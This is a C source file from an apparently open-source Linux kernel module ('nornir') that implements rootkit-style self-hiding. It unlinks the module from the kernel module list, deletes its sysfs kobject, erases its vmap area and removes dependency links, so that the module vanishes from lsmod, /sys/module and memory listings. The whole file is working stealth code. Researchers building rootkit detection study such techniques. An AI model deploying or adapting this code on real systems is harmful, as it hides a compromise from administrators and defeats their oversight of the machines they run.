/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include "common/logger.h"
#include "libs/ksym.h"
#include "mod/hide.h"

static struct mutex *orig_module_mutex;

#ifdef CONFIG_NORNIR_HIDE_MOD_UNLINK_MODULE

static void nornir_hide_mod_unlink_module(void)
{
    struct list_head *list;

    if (orig_module_mutex) {
        mutex_lock(orig_module_mutex);
    }

    list = &(THIS_MODULE->list);
    list_del(list);

    if (orig_module_mutex) {
        mutex_unlock(orig_module_mutex);
    }
}

#endif

#ifdef CONFIG_NORNIR_HIDE_MOD_UNLINK_KOBJ

static void nornir_hide_mod_unlink_kobject(void)
{
    if (orig_module_mutex) {
        mutex_lock(orig_module_mutex);
    }

    kobject_del(&(THIS_MODULE->mkobj.kobj));

    if (orig_module_mutex) {
        mutex_unlock(orig_module_mutex);
    }
}

#endif

#ifdef CONFIG_NORNIR_HIDE_MOD_UNLINK_VMAP

static void nornir_hide_mod_unlink_vma(void)
{
    struct vmap_area *va, *tmp_va;
    unsigned long mo_addr;

    mo_addr = (unsigned long) THIS_MODULE;

    list_for_each_entry_safe(va, tmp_va, _vmap_area_list, list) {
        if (mo_addr > va->va_start && mo_addr < va->va_end) {
            list_del(&va->list);
            rb_erase(&va->rb_node, vmap_area_root);
        }
    }
}

#endif

#ifdef CONFIG_NORNIR_HIDE_MODE_UNLINK_USE

static void nornir_hide_mod_unlink_use(void)
{
    struct module_use *use, *tmp;

    list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
    }
}

#endif

int nornir_init_module_hidden_subsystem(void)
{
    if (nornir_ksym_addr_lookup(
        "module_mutex", (size_t*) &orig_module_mutex, NULL, NULL
    )) {
        logger_warn("Unable to find addr of \"module_mutex\", ignore lock.\n");
        orig_module_mutex = NULL;
    }

#ifdef CONFIG_NORNIR_HIDE_MOD_UNLINK_MODULE
    nornir_hide_mod_unlink_module();
#endif

#ifdef CONFIG_NORNIR_HIDE_MOD_UNLINK_KOBJ
    nornir_hide_mod_unlink_kobject();
#endif

#ifdef CONFIG_NORNIR_HIDE_MOD_UNLINK_VMAP
    nornir_hide_mod_unlink_vma();
#endif

#ifdef CONFIG_NORNIR_HIDE_MODE_UNLINK_USE
    nornir_hide_mod_unlink_use();
#endif

    return 0;
}
